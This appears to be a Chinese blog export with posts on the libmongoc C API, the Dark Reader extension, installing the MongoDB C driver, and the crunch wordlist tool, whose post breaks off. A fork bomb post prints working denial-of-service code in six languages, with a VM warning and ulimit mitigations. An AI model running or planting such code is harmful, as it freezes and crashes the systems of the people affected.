<h5 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">MONGOC_EXPORT (<span class="keyword">bool</span>)</span><br><span class="line">mongoc_collection_delete_one (<span class="keyword">mongoc_collection_t</span> *collection,</span><br><span class="line">                              <span class="keyword">const</span> <span class="keyword">bson_t</span> *selector,</span><br><span class="line">                              <span class="keyword">const</span> <span class="keyword">bson_t</span> *opts,</span><br><span class="line">                              <span class="keyword">bson_t</span> *reply,</span><br><span class="line">                              <span class="keyword">bson_error_t</span> *error);</span><br><span class="line">MONGOC_EXPORT (<span class="keyword">bool</span>)</span><br><span class="line">mongoc_collection_delete_many (<span class="keyword">mongoc_collection_t</span> *collection,</span><br><span class="line">                               <span class="keyword">const</span> <span class="keyword">bson_t</span> *selector,</span><br><span class="line">                               <span class="keyword">const</span> <span class="keyword">bson_t</span> *opts,</span><br><span class="line">                               <span class="keyword">bson_t</span> *reply,</span><br><span class="line">                               <span class="keyword">bson_error_t</span> *error);</span><br></pre></td></tr></table></figure>

<p><strong>mongoc_collection_delete</strong> 已被弃用，这里没有列出<br>这个类似Insert，例子就没有了哈 :)</p>
<h5 id="find"><a href="#find" class="headerlink" title="find"></a>find</h5><p>这个前面就是前面的 <strong>遍历collections</strong> ……</p>
<h5 id="update"><a href="#update" class="headerlink" title="update"></a>update</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">MONGOC_EXPORT (<span class="keyword">bool</span>)</span><br><span class="line">mongoc_collection_update (<span class="keyword">mongoc_collection_t</span> *collection,</span><br><span class="line">                          <span class="keyword">mongoc_update_flags_t</span> flags,</span><br><span class="line">                          <span class="keyword">const</span> <span class="keyword">bson_t</span> *selector,</span><br><span class="line">                          <span class="keyword">const</span> <span class="keyword">bson_t</span> *update,</span><br><span class="line">                          <span class="keyword">const</span> <span class="keyword">mongoc_write_concern_t</span> *write_concern,</span><br><span class="line">                          <span class="keyword">bson_error_t</span> *error);</span><br><span class="line">MONGOC_EXPORT (<span class="keyword">bool</span>)</span><br><span class="line">mongoc_collection_update_one (<span class="keyword">mongoc_collection_t</span> *collection,</span><br><span class="line">                              <span class="keyword">const</span> <span class="keyword">bson_t</span> *selector,</span><br><span class="line">                              <span class="keyword">const</span> <span class="keyword">bson_t</span> *update,</span><br><span class="line">                              <span class="keyword">const</span> <span class="keyword">bson_t</span> *opts,</span><br><span class="line">                              <span class="keyword">bson_t</span> *reply,</span><br><span class="line">                              <span class="keyword">bson_error_t</span> *error);</span><br><span class="line">MONGOC_EXPORT (<span class="keyword">bool</span>)</span><br><span class="line">mongoc_collection_update_many (<span class="keyword">mongoc_collection_t</span> *collection,</span><br><span class="line">                               <span class="keyword">const</span> <span class="keyword">bson_t</span> *selector,</span><br><span class="line">                               <span class="keyword">const</span> <span class="keyword">bson_t</span> *update,</span><br><span class="line">                               <span class="keyword">const</span> <span class="keyword">bson_t</span> *opts,</span><br><span class="line">                               <span class="keyword">bson_t</span> *reply,</span><br><span class="line">                               <span class="keyword">bson_error_t</span> *error);</span><br></pre></td></tr></table></figure>

<p>注意那个 <strong>mongoc_update_flags_t</strong>，这个经常用到。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> &#123;</span><br><span class="line">   MONGOC_UPDATE_NONE = <span class="number">0</span>,</span><br><span class="line">   MONGOC_UPDATE_UPSERT = <span class="number">1</span> &lt;&lt; <span class="number">0</span>,</span><br><span class="line">   MONGOC_UPDATE_MULTI_UPDATE = <span class="number">1</span> &lt;&lt; <span class="number">1</span>,</span><br><span class="line">&#125; <span class="keyword">mongoc_update_flags_t</span>;</span><br></pre></td></tr></table></figure>

<p>现在就 <strong>mongoc_collection_update</strong> 这个函数为例，除了那个 const mongoc_write_concern_t *write_concern 参数以外，其他的似乎都挺常用。。。不过再次之前，先来看看Mongo下update数据。</p>
<p>当前 db_test 存在如下数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db.test.find()</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;5a8e30c0d077dc147db71f83&quot;), &quot;name&quot; : &quot;xiaolong&quot;, &quot;age&quot; : 14 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;5a8e3102d077dc147db71f84&quot;), &quot;name&quot; : &quot;xiaoqiang&quot;, &quot;age&quot; : 10 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;5a8e3108d077dc147db71f85&quot;), &quot;name&quot; : &quot;xiaofeng&quot;, &quot;age&quot; : 12 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;5a8e38ba53d6700f027556c2&quot;), &quot;name&quot; : &quot;xiaoHong&quot;, &quot;age&quot; : 15, &quot;info&quot; : [ &#123; &quot;country&quot; : &quot;China&quot; &#125;, &#123; &quot;phone&quot; : &quot;110&quot;</span><br></pre></td></tr></table></figure>

<p>我要查看 age 大或等于 12 的记录，那么我可以这样做</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">db.test.find(&#123;&apos;age&apos;:&#123;&apos;$gte&apos;:12&#125;&#125;)</span><br><span class="line">&gt;&#123; &quot;_id&quot; : ObjectId(&quot;5a8e30c0d077dc147db71f83&quot;), &quot;name&quot; : &quot;xiaolong&quot;, &quot;age&quot; : 14 &#125;</span><br><span class="line">&quot;xiaofeng&quot;, &quot;age&quot; : 12 &#125;</span><br><span class="line">&#123; &quot;_id&quot; : ObjectId(&quot;5a8e38ba53d6700f027556c2&quot;), &quot;name&quot; : &quot;xiaoHong&quot;, &quot;age&quot; : 15, &quot;info&quot; : [ &#123; &quot;country&quot; : &quot;China&quot; &#125;, &#123; &quot;phone&quot; : &quot;110&quot; &#125; ] &#125;</span><br></pre></td></tr></table></figure>

<p>要修改 age 大或等于 12 的 name 的<strong>所有</strong>记录，那么我么可以这样做<br>db.test.update({‘age’:{‘$gte’:12}},{‘$set’:{‘name’:’XXXXX’}},false,<strong>true</strong>)</p>
<p>类似与MySQL：update tb_xxx set name=’xxxxx’ where age &gt;=12</p>
<p>这时候回过头来看看</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const bson_t *selector =&gt; &#123;&apos;age&apos;:&#123;&apos;$gte&apos;:12&#125; &#125;</span><br><span class="line">const bson_t *update =&gt; &#123;&apos;$set&apos;:&#123;&apos;name&apos;:&apos;XXXXX&apos;&#125;&#125;</span><br><span class="line">mongoc_update_flags_t flags =&gt; MONGOC_UPDATE_MULTI_UPDATE</span><br></pre></td></tr></table></figure>

<p>于是可以这样写</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bson_t</span> *query=BCON_NEW(<span class="string">"age"</span>,<span class="string">"&#123;"</span>,</span><br><span class="line">                      <span class="string">"$gte"</span>,BCON_INT32(<span class="number">12</span>),</span><br><span class="line">                             <span class="string">"&#125;"</span>);</span><br><span class="line"><span class="keyword">bson_t</span> *update=BCON_NEW(<span class="string">"$set"</span>,<span class="string">"&#123;"</span>,</span><br><span class="line">                       <span class="string">"age"</span>,BCON_INT32(<span class="number">888</span>),</span><br><span class="line">                              <span class="string">"&#125;"</span>);</span><br><span class="line"><span class="keyword">bool</span> retr= mongoc_collection_update(coll,MONGOC_UPDATE_MULTI_UPDATE,query,update,<span class="literal">NULL</span>,&amp;error);</span><br><span class="line"><span class="keyword">if</span>(!retr)&#123;</span><br><span class="line">     	<span class="built_in">cout</span>&lt;&lt;error.message&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">bson_destroy(query);</span><br><span class="line">bson_destroy(update);</span><br></pre></td></tr></table></figure>

<p>注意，<strong>“age”,”{“</strong> 要单独写，不能写成 <strong>“age{“</strong>，否则 <strong>src/bson/bcon.c:784 bcon_append_ctx_va(): precondition failed: type == BCON_TYPE_UTF8</strong> 这是最坑爹的地方</p>
<h4 id="内存释放"><a href="#内存释放" class="headerlink" title="内存释放"></a>内存释放</h4><p>别以为这样就结束了哦，还要记得要释放所有的内存</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 释放char*指针</span></span><br><span class="line">bson_free(<span class="keyword">void</span> *mem);</span><br><span class="line"><span class="comment">// 释放 bson_t *bson文档</span></span><br><span class="line">bson_destroy(<span class="keyword">bson_t</span> *bson);</span><br><span class="line">mongoc_cursor_destroy(<span class="built_in">cursor</span>);</span><br><span class="line">mongoc_collection_destroy(coll);</span><br><span class="line">mongoc_database_destroy(database);</span><br><span class="line">mongoc_client_destroy(client);</span><br><span class="line">mongoc_cleanup();</span><br></pre></td></tr></table></figure>

<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>编译方法也很简单</p>
<blockquote>
<p>g++ main.cpp -o main <code>pkg-config –libs –cflags libmongoc-1.0</code></p>
</blockquote>
<p>或者</p>
<blockquote>
<p>g++ main.cpp -o main -lbson-1.0 -lmongoc-1.0</p>
</blockquote>
<h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>不得不说，用mongoc来操控mongoDB数据库还挺复杂的。因此建议自己把这些函数封装成类对象。其实，关于mongoc封装成类，<strong>Mongoc</strong>目前已经发展到了<strong>MongoCXX</strong>，以Mongoc为基础，所有操作都被封装到类里面。引入了几个特殊的对象 <strong>view、value、view_or_value</strong>。同时，构建(<strong>Build</strong>)一个BSON文档有两种方法：<strong>basic、stream</strong>。可 <a href="https://mongodb.github.io/mongo-cxx-driver/mongocxx-v3/installation/" target="_blank" rel="noopener">参阅这里</a></p>
<p>以后有空再介绍<strong><em>mongocxx</em></strong>吧～</p>
<p>参考 <a href="http://mongoc.org/libmongoc/current/tutorial.html" target="_blank" rel="noopener">http://mongoc.org/libmongoc/current/tutorial.html</a></p>
]]></content>
      <categories>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Linux</tag>
        <tag>C</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>Chrome浏览器网页变成黑色(Dark Reader)</title>
    <url>/chrome-dark/</url>
    <content><![CDATA[<p>Dark Reader 就是一个开源chrome浏览器的扩展程序，它可以让大部分网页在夜间和日间浏览。对于使用Chrome的用户来说，这是一个很好的护眼插件。目前Dark Reader支持的浏览器有Chrome，Firefox，Safari</p>
<a id="more"></a>

<h3 id="DuckduckGo和Dark-Reader"><a href="#DuckduckGo和Dark-Reader" class="headerlink" title="DuckduckGo和Dark Reader"></a>DuckduckGo和Dark Reader</h3><p>总所周知，DuckduckGo是一个保护用户隐私的搜索引擎，但它有一个好处是能够设置页面的主题</p>
<p><img src="/uploads/images/darkreader/file_001.png" alt="img"></p>
<p>通过Dark Reader插件后的chrome浏览器</p>
<p><img src="/uploads/images/darkreader/file_002.png" alt="img"></p>
<h3 id="获取Dark-Reader"><a href="#获取Dark-Reader" class="headerlink" title="获取Dark Reader"></a>获取Dark Reader</h3><blockquote>
<p><a href="https://chrome.google.com/webstore/detail/dark-reader/eimadpbcbfnmbkopoojfekhnkhdbieeh?utm_source=chrome-app-launcher-info-dialog" target="_blank" rel="noopener">1. chrome网上应用店</a></p>
<p><a href="https://github.com/darkreader/darkreader" target="_blank" rel="noopener">2. Github</a></p>
</blockquote>
<h3 id="安装方式"><a href="#安装方式" class="headerlink" title="安装方式"></a>安装方式</h3><p>对于第一种安装方式，这里不在多说，很简单。这里介绍下第二种安装方法。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/darkreader/darkreader.git</span><br><span class="line">cd darkreader</span><br><span class="line">npm install</span><br><span class="line">npm run release</span><br></pre></td></tr></table></figure>

<p>这是就会在当前目录下生成 <strong>build.zip</strong>，<strong>build-firefox.xpi</strong>，<strong>build文件夹</strong>。</p>
<p>其中 build-firefox.xpi 用于Firefox，而build则用于chrome，可能有人会问，chrome的插件后缀不是 <strong>.crx</strong> 吗？</p>
<p>不急，我们打开chrome-&gt;扩展程序，开启【开发者模式】后，【加载已解压的扩展程序…】后找到那个 build文件夹 后发现插件加载成功！</p>
<p><img src="/uploads/images/darkreader/file_005.png" alt="img"></p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>功能如下</p>
<ul>
<li>通过网站列表过滤设置黑暗/明亮主题</li>
<li>亮度，对比度，棕褐色滤镜，灰度</li>
<li>字体，文字描边</li>
</ul>
<p><img src="/uploads/images/darkreader/file_004.png" alt="img"></p>
<h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>总之，Dark Reader是一个非常有实用价值的开源chrome插件。但是Android Chrome没有安装插件这一功能，不过可以通过 <strong>chrome://flags</strong> 来设置chrome主题！</p>
<p> bye~</p>
]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Chrome</tag>
        <tag>Google</tag>
      </tags>
  </entry>
  <entry>
    <title>Fork bomb命令</title>
    <url>/fork-bomb-commands/</url>
    <content><![CDATA[<p><strong>Fork bomb</strong> 是一种拒绝服务攻击，无限 <strong>fork</strong> 子进程以耗尽可用系统资源(CPU占用率高达100%)，由于资源匮乏而导致系统速度放慢或崩溃。</p>
<a id="more"></a>

<h3 id="Linux-Bash"><a href="#Linux-Bash" class="headerlink" title="Linux Bash"></a>Linux Bash</h3><p>一个最简单的例子 (请在虚拟机上执行！)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ :()&#123; :|:&amp; &#125;;:</span><br></pre></td></tr></table></figure>

<ul>
<li>:() 定义一个名为 <strong>:</strong> 的函数</li>
<li>{ … } 函数体</li>
<li>:|: 递归调用该命令</li>
<li>&amp; 后台运行，前台运行直接为 <strong>;</strong></li>
<li>; 分割符</li>
<li>: 执行名为 <strong>:</strong> 的函数</li>
</ul>
<p>执行该命令会创建一个子进程，然后在无限循环中重复自己，不断产生进程，结果是一个无法响应的系统(死机)。</p>
<h3 id="Windows-Batch"><a href="#Windows-Batch" class="headerlink" title="Windows Batch"></a>Windows Batch</h3><p>Windows 批处理同样也可以发生fork bomb。新建一个.bat批处理文件，并添加一下简短的内容</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">%</span><span class="bash">0 | %0</span></span><br></pre></td></tr></table></figure>

<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	os.fork()</span><br></pre></td></tr></table></figure>

<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ForkBomb</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"javaw"</span>, <span class="string">"-cp"</span>, System.getProperty(<span class="string">"java.class.path"</span>), <span class="string">"ForkBomb"</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="C"><a href="#C" class="headerlink" title="C"></a>C</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">      fork();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="variable">$true</span>) &#123; </span><br><span class="line">    <span class="built_in">Start-Process</span> powershell.exe <span class="literal">-ArgumentList</span> <span class="string">"-NoExit"</span>, <span class="string">"Get-ChildItem -Recurse C:"</span>;</span><br><span class="line">    <span class="built_in">Invoke-Expression</span> <span class="literal">-Command</span> <span class="string">'while($true) &#123;Start-Process powershell.exe -ArgumentList "-NoExit", "Get-ChildItem -Recurse C:"&#125;'</span>;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="避免"><a href="#避免" class="headerlink" title="避免"></a>避免</h3><p>在Linux下，可以通过 <strong>ulimit</strong> 设置的最大进程数(max user processes)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ulimit -a</span><br><span class="line">core file size          (blocks, -c) 0</span><br><span class="line">data seg size           (kbytes, -d) unlimited</span><br><span class="line">scheduling priority             (-e) 0</span><br><span class="line">file size               (blocks, -f) unlimited</span><br><span class="line">pending signals                 (-i) 30195</span><br><span class="line">max locked memory       (kbytes, -l) 16384</span><br><span class="line">max memory size         (kbytes, -m) unlimited</span><br><span class="line">open files                      (-n) 1024</span><br><span class="line">pipe size            (512 bytes, -p) 8</span><br><span class="line">POSIX message queues     (bytes, -q) 819200</span><br><span class="line">real-time priority              (-r) 0</span><br><span class="line">stack size              (kbytes, -s) 8192</span><br><span class="line">cpu time               (seconds, -t) unlimited</span><br><span class="line">max user processes              (-u) 30195</span><br><span class="line">virtual memory          (kbytes, -v) unlimited</span><br><span class="line">file locks                      (-x) unlimited</span><br></pre></td></tr></table></figure>

<p>但是这只能在当前终端生效。因此，还可以修改 <strong>/etc/security/limits.conf</strong> 配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#&lt;domain&gt;        &lt;type&gt;  &lt;item&gt;  &lt;value&gt;</span><br><span class="line">*               soft    nproc            4096</span><br></pre></td></tr></table></figure>

<h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>参考资料</p>
<ul>
<li><a href="https://www.incapsula.com/ddos/attack-glossary/fork-bomb.html" target="_blank" rel="noopener">https://www.incapsula.com/ddos/attack-glossary/fork-bomb.html</a></li>
<li><a href="https://en.wikipedia.org/wiki/Fork_bomb" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Fork_bomb</a></li>
</ul>
]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB C Driver安装</title>
    <url>/mongodb-driver-install/</url>
    <content><![CDATA[<p>这次就MongoDB来记录下安装C Driver过程。</p>
<a id="more"></a>

<h3 id="Install-MongoDB-C-Driver"><a href="#Install-MongoDB-C-Driver" class="headerlink" title="Install MongoDB C Driver"></a>Install MongoDB C Driver</h3><p>我百度了一下，有关用C/C++调用MongoDB提供的接口的教程，貌似很少，我也没怎么Google，索性就看官网提供的文档算了，反正大部分都是代码。。。</p>
<p>MongoDB C Driver支持的平台如下</p>
<table>
<thead>
<tr>
<th>Supported Platforms</th>
</tr>
</thead>
<tbody><tr>
<td>Archlinux</td>
</tr>
<tr>
<td>Debian 8.1</td>
</tr>
<tr>
<td>macOS 10.10</td>
</tr>
<tr>
<td>Microsoft Windows Server 2008</td>
</tr>
<tr>
<td>RHEL 7.0, 7.1, 7.2</td>
</tr>
<tr>
<td>SUSE 12</td>
</tr>
<tr>
<td>Ubuntu 12.04, 14.04, 16.04</td>
</tr>
<tr>
<td>Clang 3.4, 3.5, 3.7, 3.8</td>
</tr>
<tr>
<td>GCC 4.6, 4.8, 4.9, 5.3</td>
</tr>
<tr>
<td>MinGW-W64</td>
</tr>
<tr>
<td>Visual Studio 2010, 2013, 2015</td>
</tr>
<tr>
<td>x86, x86_64, ARM (aarch64), Power8 (ppc64le), zSeries (s390x)</td>
</tr>
</tbody></table>
<h4 id="从包管理工具安装"><a href="#从包管理工具安装" class="headerlink" title="从包管理工具安装"></a>从包管理工具安装</h4><p>对于Debian或Ubuntu，可以直接从以下命令安装</p>
<blockquote>
<p>apt-get install libmongoc-1.0-0</p>
</blockquote>
<p>对于其他Linux系统，也是大同小异的。然而，我还是比较喜欢编译安装，感觉可控性更高些。</p>
<h4 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h4><blockquote>
<p>OpenSSL is required for authentication or for SSL connections to MongoDB. Kerberos or LDAP support requires Cyrus SASL.</p>
</blockquote>
<p>这一步我直接跳过。</p>
<p>注意 ，编译mongo-c-driver还需要 <strong>libbson</strong> 不过mongo-c-driver已经包含了该库源码</p>
<p>注意，<a href="http://mongoc.org/libmongoc/current/init-cleanup.html" target="_blank" rel="noopener">–disable-automatic-init-and-cleanup</a> 是官网推荐的参数，意思大概就是 禁止自动初始化和释放，这应该跟调用库有关，不过我没有加上</p>
<p>默认安装到 /usr/local</p>
<p>之后就可以 make + make install</p>
<h4 id="Building-from-git"><a href="#Building-from-git" class="headerlink" title="Building from git"></a>Building from git</h4><blockquote>
<p>git clone <a href="https://github.com/mongodb/mongo-c-driver.git" target="_blank" rel="noopener">https://github.com/mongodb/mongo-c-driver.git</a></p>
</blockquote>
<p>这个方法我没怎么注意，有兴趣的可以自己尝试下</p>
<h4 id="其他平台的构建"><a href="#其他平台的构建" class="headerlink" title="其他平台的构建"></a>其他平台的构建</h4><p>除了Linux，常用的Mac OS，Windows的安装方法这里就不在赘述了</p>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>因为我是从源码编译安装的，在这过程中，也遇到了一些奇葩问题。<br>configure默认prefix为 /usr/local，libmongoc-1.0，libbson-1.0头文件安装到/usr/local/include，以及相应的链接库在/usr/local/lib。这似乎没有什么错误。但是当我用编写代码时发现我引用头文件</p>
<blockquote>
<p>#include</p>
</blockquote>
<p>时看到它里面其实包含</p>
<blockquote>
<p>#include</p>
</blockquote>
<p>而经过 <code>locate bson.h</code>，结果发现只存在 /usr/local/include/libbson-1.0/bson.h。。。这就是问题了</p>
<p>于是我可以cp /usr/local/include/libbson-1.0 目录下所有文件到 /usr/include</p>
<h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>编译安装MongoDB C Driver算是简单了吧，与 MongoCXX 的安装方法相比，这的确算是简单了 :)</p>
<p>详细过程参阅 <strong>Installing the MongoDB C Driver</strong></p>
<p>bye~</p>
]]></content>
      <categories>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>C</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>强大的Crunch字典生成工具</title>
    <url>/linux-crunch/</url>
    <content><![CDATA[<p>计算机里的字典这东西,说白了就是保存着大量的可知数据,一般是用来<strong>暴力破解</strong>的……而要想要爆破成功,就得有一个强大而又有用的字典.<br>而Linux下的一个开源程序 <strong>crunch</strong> 就是为了对字典的生成而被创造出来的.</p>
<a id="more"></a>

<h3 id="crunch"><a href="#crunch" class="headerlink" title="crunch"></a>crunch</h3><p>安装很简单:<code>apt-get install crunch</code><br>crunch的使用方法建议 <code>man crunch</code> 查看帮助文档,并且其中也有一些例子.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CRUNCH(1)                        General Commands Manual                        CRUNCH(1)</span><br><span class="line">NAME</span><br><span class="line">       crunch - generate wordlists from a character set</span><br><span class="line">SYNOPSIS</span><br><span class="line">       crunch &lt;min-len&gt; &lt;max-len&gt; [&lt;charset string&gt;] [options]</span><br><span class="line">DESCRIPTION</span><br><span class="line">       Crunch  can  create  a  wordlist  based  on criteria you specify.  The output from</span><br><span class="line">       crunch can be sent to the screen, file,  or  to  another  program.   The  required</span><br><span class="line">       parameters are:</span><br><span class="line">       min-len</span><br><span class="line">              The  minimum  length  string  you  want crunch to start at.  This option is</span><br><span class="line">              required even for parameters that won&apos;t use the value.</span><br><span class="line">       max-len</span><br><span class="line">              The maximum length string you want  crunch  to  end  at.   This  option  is</span><br><span class="line">              required even for parameters that won&apos;t use the value.</span><br><span class="line">       charset string</span><br><span class="line">              You  may specify character sets for crunch to use on the command line or if</span><br><span class="line">              you leave it blank crunch will use the default character sets.   The  order</span><br><span class="line">              MUST  BE  lower  case  characters, upper case characters, numbers, and then</span><br><span class="line">              symbols.  If you don&apos;t follow this order you will not get the  results  you</span><br><span class="line">              want.   You  MUST  specify  either  values for the character type or a plus</span><br><span class="line">              sign.  NOTE: If you want to include the space character in  your  character</span><br><span class="line">              set  you must escape it using the \ character or enclose your character set</span><br><span class="line">              in quotes i.e. &quot;abc &quot;.  See the examples 3, 11, 12, and 13 for examples.</span><br><span class="line">OPTIONS</span><br><span class="line">       -b number[type]</span><br><span class="line">              Specifies the size of the output file, only works  if  -o  START  is  used,</span><br><span class="line">              i.e.:  60MB  The output files will be in the format of starting letter-end‐</span><br><span class="line">              ing letter for example: ./crunch 4 5 -b 20mib  -o  START  will  generate  4</span><br><span class="line">              files:  aaaa-gvfed.txt,  gvfee-ombqy.txt,  ombqz-wcydt.txt, wcydu-zzzzz.txt</span><br><span class="line">              valid values for type are kb, mb, gb, kib, mib, and gib.  The  first  three</span><br><span class="line">              types are based on 1000 while the last three types are based on 1024.  NOTE</span><br><span class="line">              There is no space between the number and type.  For example 500mb  is  cor‐</span><br><span class="line">              rect 500 mb is NOT correct.</span><br><span class="line">       -c number</span><br><span class="line">              Specifies  the  number  of  lines to write to output file, only works if -o</span><br><span class="line">              START is used, i.e.: 60  The output files will be in the format of starting</span><br><span class="line">              letter-ending   letter   for   example:  ./crunch  1  1  -f  /pentest/pass‐</span><br><span class="line">              word/crunch/charset.lst mixalpha-numeric-all-space  -o  START  -c  60  will</span><br><span class="line">              result  in  2 files: a-7.txt and 8-\ .txt  The reason for the slash in  the</span><br><span class="line">              second filename is the ending character is space and ls has to escape it to</span><br><span class="line">              print  it.   Yes you will need to put in the \ when specifying the filename</span><br><span class="line">              because the last character is a space.</span><br><span class="line">       -d numbersymbol</span><br><span class="line">              Limits the number of duplicate characters.  -d 2@  limits  the  lower  case</span><br><span class="line">              alphabet to output like aab and aac.  aaa would not be generated as that is</span><br><span class="line">              3 consecutive letters of a.  The format is number then symbol where  number</span><br><span class="line">              is the maximum number of consecutive characters and symbol is the symbol of</span><br><span class="line">              the the character set you want to limit i.e. @,%^   See examples 17-19.</span><br><span class="line">       -e string</span><br><span class="line">              Specifies when crunch should stop early</span><br><span class="line">       -f /path/to/charset.lst charset-name</span><br><span class="line">              Specifies a character set from the charset.lst</span><br><span class="line">       -i  Inverts  the   output   so   instead   of   aaa,aab,aac,aad,   etc   you   get</span><br><span class="line">              aaa,baa,caa,daa,aba,bba, etc</span><br><span class="line">       -l  When  you  use  the -t option this option tells crunch which symbols should be</span><br><span class="line">              treated as literals.  This will allow you to use the placeholders  as  let‐</span><br><span class="line">              ters  in  the  pattern.   The -l option should be the same length as the -t</span><br><span class="line">              option.  See example 15.</span><br><span class="line">       -m Merged with -p.  Please use -p instead.</span><br><span class="line">       -o wordlist.txt</span><br><span class="line">              Specifies the file to write the output to, eg: wordlist.txt</span><br><span class="line">       -p charset OR -p word1 word2 ...</span><br><span class="line">              Tells crunch to generate words that don&apos;t have  repeating  characters.   By</span><br><span class="line">              default  crunch  will  generate  a  wordlist size of #of_chars_in_charset ^</span><br><span class="line">              max_length.  This option will instead generate #of_chars_in_charset!.   The</span><br><span class="line">              !  stands for factorial.  For example say the charset is abc and max length</span><br><span class="line">              is 4..  Crunch will by default generate 3^4 = 81 words.  This  option  will</span><br><span class="line">              instead generate 3! = 3x2x1 = 6 words (abc, acb, bac, bca, cab, cba).  THIS</span><br><span class="line">              MUST BE THE LAST OPTION!  This option CANNOT be used with -s and it ignores</span><br><span class="line">              min and max length however you must still specify two numbers.</span><br><span class="line">       -q filename.txt</span><br><span class="line">              Tells  crunch  to read filename.txt and permute what is read.  This is like</span><br><span class="line">              the -p option except it gets the input from filename.txt.</span><br><span class="line">       -r Tells crunch to resume generate words from where it left off.  -r only works if</span><br><span class="line">              you  use -o.  You must use the same command as the original command used to</span><br><span class="line">              generate the words.  The only exception to this is the -s option.  If  your</span><br><span class="line">              original  command  used  the -s option you MUST remove it before you resume</span><br><span class="line">              the session.  Just add -r to the end of the original command.</span><br><span class="line">       -s startblock</span><br><span class="line">              Specifies a starting string, eg: 03god22fs</span><br><span class="line">       -t @,%^</span><br><span class="line">              Specifies a pattern, eg: @@god@@@@ where the only the @&apos;s,  ,&apos;s,  %&apos;s,  and</span><br><span class="line">              ^&apos;s will change.</span><br><span class="line">              @ will insert lower case characters</span><br><span class="line">              , will insert upper case characters</span><br><span class="line">              % will insert numbers</span><br><span class="line">              ^ will insert symbols</span><br><span class="line">       -u</span><br><span class="line">              The -u option disables the printpercentage thread.  This should be the last</span><br><span class="line">              option.</span><br><span class="line">       -z gzip, bzip2, lzma, and 7z</span><br><span class="line">              Compresses the output from the  -o  option.   Valid  parameters  are  gzip,</span><br><span class="line">              bzip2, lzma, and 7z.</span><br><span class="line">              gzip  is  the  fastest  but  the compression is minimal.  bzip2 is a little</span><br><span class="line">              slower than gzip but has better compression.  7z is  slowest  but  has  the</span><br><span class="line">              best compression.</span><br></pre></td></tr></table></figure>

<p>命令格式为: <code>crunch &lt;min-len&gt; &lt;max-len&gt; [&lt;charset string&gt;] [options]</code></p>
<ul>
<li>min-len: 生成字典的最小长度</li>
<li>max-len: 生成字典的最大长度</li>
</ul>
<p>其中,几个比较重要的参数:</p>
<table>
<thead>
